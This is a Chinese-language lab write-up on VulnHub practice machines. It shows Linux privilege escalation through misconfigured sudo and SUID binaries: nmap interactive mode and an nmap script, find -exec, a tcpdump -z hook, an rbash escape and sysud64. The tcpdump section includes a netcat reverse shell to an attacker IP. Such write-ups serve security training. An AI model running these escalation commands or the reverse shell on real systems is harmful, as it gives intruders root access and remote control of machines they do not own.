介绍：这篇文章主要记录了前端时间在搞靶机的时候，遇到的 Linux 的提权。

0x00 前言

最近一直漏扫工具人，好久不搞测试，手就得生疏了，所以搞了一些靶机，记录一下其中遇到的Linux的提权。

0x01 nmap提权

sudo -l

发现可以无密使用root权限执行namp。可以通过nmap来提权。

1.1 nmap(2.02至5.21)

靶机Mr-Robot下载地址：https://www.vulnhub.com/entry/mr-robot-1,151/

nmap低版本存在交互模式，允许用户执行shell命令。

find / -perm -4000 2> /dev/null //查询靶机可执行的二进制文件

发现存在nmap，查看nmap版本。

执行nmap --interactive，提权成功。

1.2 namp其它高版本

靶机DC-6下载地址:https://www.vulnhub.com/entry/dc-6,315/

nmap 可以执行脚本文件，可以创建一个文件并写入反弹 shell 的命令，从而提权。查看一下namp的版本。

echo 'os.execute("/bin/sh")' > shellsudo -u root nmap --script=shell

提权成功：

利用python获取一个交互式shell python -c '__import__("pty").spawn("/bin/bash")'

0x02 find提权

靶机DC-1下载地址:https://www.vulnhub.com/entry/dc-1,292/

利用msf的Drupal的漏洞，获得了靶机的session,而且session的类型为meteperter. sessions -l //查看session的类型

然后：

shell//利用python获得一个交互式的shellpython -c '__import__("pty").spawn("/bin/bash")'

然后提权。

find / -perm -4000 2> /dev/null //查询靶机可执行的二进制文件

发现find，可以利用这个进行提权。

touch testfind test -exec whoami \;    //find命令检查是否以root用户身份执行命令find test -exec /bin/sh \;    //使用find命令执行/bin/sh

0x03 tcpdump提权

靶机webdeveloper下载地址：https://www.vulnhub.com/entry/webdeveloper-1,288/

查看一下执行的权限：

以root权限运行tcpdump。

当当前用户可以通过sudo执行tcpdump时，可以用来进行提权
tcpdump中有两个参数-z和-Z，前者用来执行一个脚本，后者用来指定tcpdump以哪个用户运行，当可以通过sudo执行时，则可以指定以root用户运行一个脚本，从而达到提权的目的

先写一个反弹的脚本(192.168.0.102ip是attack的)

echo "mknod backpipe p && nc 192.168.0.102 4444 0<backpipe | /bin/bash 1>backpipe" >> /tmp/shell.sh

然后赋权，并使用tcpdump执行命令：

chmod +x /tmp/shell.shsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root

成功提权。

0x04 sysud64提权

靶机unknowndevice64下载地址:https://www.vulnhub.com/entry/unknowndevice64-1,293/ 这个靶机是rbash的shell

如果可以执行vi和export命令，可以绕过rbash进行提权。vi打开，输入:!/bin/bash

执行结果如下，然后执行操作：
export SHELL=/bin/bash:$SHELL   //将/bin/bash导出到shell环境变量export PATH=/usr/bin:$PATH    //将/usr/bin目录导出到PATH环境变量

发现sysud64，然后使用sysud64的-o file用法将root用户的shell导出到该用户

sudo sysud64 -o /dev/null /bin/sh

查看权限，为root权限。提权成功：
